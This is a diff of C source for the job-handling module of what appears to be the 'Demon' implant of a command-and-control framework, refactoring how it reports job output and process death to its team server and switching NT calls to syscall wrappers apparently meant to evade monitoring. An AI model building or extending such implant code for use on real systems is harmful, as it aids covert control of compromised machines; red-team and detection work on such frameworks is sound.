@@ -115,22 +115,22 @@ VOID JobCheckList()
                         AnonPipesRead( ( ( PANONPIPE ) JobList->Data ), JobList->RequestID );
 
                         // notify the TS that the process is dead, so that the RequestID can be closed
-                        PPACKAGE Package = PackageCreateWithRequestID( JobList->RequestID, DEMON_COMMAND_JOB );
+                        PPACKAGE Package = PackageCreateWithRequestID( DEMON_COMMAND_JOB, JobList->RequestID );
                         PackageAddInt32( Package, DEMON_COMMAND_JOB_DIED );
-                        PackageTransmit( Package, NULL, NULL );
+                        PackageTransmit( Package );
 
                         // free resources
-                        Instance.Win32.NtClose( JobList->Handle );
+                        SysNtClose( JobList->Handle );
                         JobList->Handle = NULL;
                         if ( ( ( PANONPIPE ) JobList->Data )->StdOutWrite )
                         {
-                            Instance.Win32.NtClose( ( ( PANONPIPE ) JobList->Data )->StdOutWrite );
+                            SysNtClose( ( ( PANONPIPE ) JobList->Data )->StdOutWrite );
                             (( PANONPIPE ) JobList->Data )->StdOutWrite = NULL;
                         }
 
                         if ( ( ( PANONPIPE ) JobList->Data )->StdOutRead )
                         {
-                            Instance.Win32.NtClose( ( ( PANONPIPE ) JobList->Data )->StdOutRead );
+                            SysNtClose( ( ( PANONPIPE ) JobList->Data )->StdOutRead );
                             ( ( PANONPIPE ) JobList->Data )->StdOutRead = NULL;
                         }
                         DATA_FREE( JobList->Data, sizeof( ANONPIPE ) )
@@ -157,9 +157,9 @@ VOID JobCheckList()
 
                                 if ( Instance.Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                 {
-                                    PPACKAGE Package = PackageCreateWithRequestID( JobList->RequestID, DEMON_OUTPUT );
+                                    PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, JobList->RequestID );
                                     PackageAddBytes( Package, Buffer, Available );
-                                    PackageTransmit( Package, NULL, NULL );
+                                    PackageTransmit( Package );
                                 }
 
                                 DATA_FREE( Buffer, Size )
@@ -200,14 +200,11 @@ BOOL JobSuspend( DWORD JobID )
 
                 if ( Handle )
                 {
-                    NtStatus = Instance.Syscall.NtSuspendThread( JobList->Handle, NULL );
-                    if ( NT_SUCCESS( NtStatus ) )
-                    {
+                    NtStatus = SysNtSuspendThread( JobList->Handle, NULL );
+                    if ( NT_SUCCESS( NtStatus ) ) {
                         JobList->State = JOB_STATE_SUSPENDED;
                         return TRUE;
-                    }
-                    else
-                    {
+                    } else {
                         return FALSE;
                     }
                 }
@@ -249,7 +246,7 @@ BOOL JobResume( DWORD JobID )
 
                 if ( Handle )
                 {
-                    NtStatus = Instance.Syscall.NtResumeThread( JobList->Handle, NULL );
+                    NtStatus = SysNtResumeThread( JobList->Handle, NULL );
                     if ( NT_SUCCESS( NtStatus ) )
                     {
                         JobList->State = JOB_STATE_RUNNING;
@@ -303,11 +300,11 @@ BOOL JobKill( DWORD JobID )
                         {
                             PUTS( "Kill using handle" )
 
-                            if ( ! NT_SUCCESS( NtStatus = Instance.Syscall.NtTerminateThread( JobList->Handle, STATUS_SUCCESS ) ) )
+                            if ( ! NT_SUCCESS( NtStatus = Instance.Win32.NtTerminateThread( JobList->Handle, STATUS_SUCCESS ) ) )
                             {
                                 PRINTF( "TerminateThread NtStatus:[%ul]\n", NtStatus )
                                 NtSetLastError( Instance.Win32.RtlNtStatusToDosError( NtStatus ) );
-                                CALLBACK_GETLASTERROR;
+                                PACKAGE_ERROR_WIN32;
                                 Success = FALSE;
                             }
                             else
@@ -355,9 +352,9 @@ BOOL JobKill( DWORD JobID )
 
                                 if ( Instance.Win32.ReadFile( ( ( PANONPIPE ) JobList->Data )->StdOutRead, Buffer, Available, &Available, NULL ) )
                                 {
-                                    PPACKAGE Package = PackageCreateWithRequestID( JobList->RequestID, DEMON_OUTPUT );
+                                    PPACKAGE Package = PackageCreateWithRequestID( DEMON_OUTPUT, JobList->RequestID );
                                     PackageAddBytes( Package, Buffer, Available );
-                                    PackageTransmit( Package, NULL, NULL );
+                                    PackageTransmit( Package );
                                 }
 
                                 DATA_FREE( Buffer, Size )
@@ -422,7 +419,7 @@ VOID JobRemove( DWORD JobID )
     }
 
     if ( JobToRemove->Handle )
-        Instance.Win32.NtClose( JobToRemove->Handle );
+        SysNtClose( JobToRemove->Handle );
 
     if ( ( JobToRemove->Type == JOB_TYPE_TRACK_PROCESS ) && JobToRemove->Data )
     {
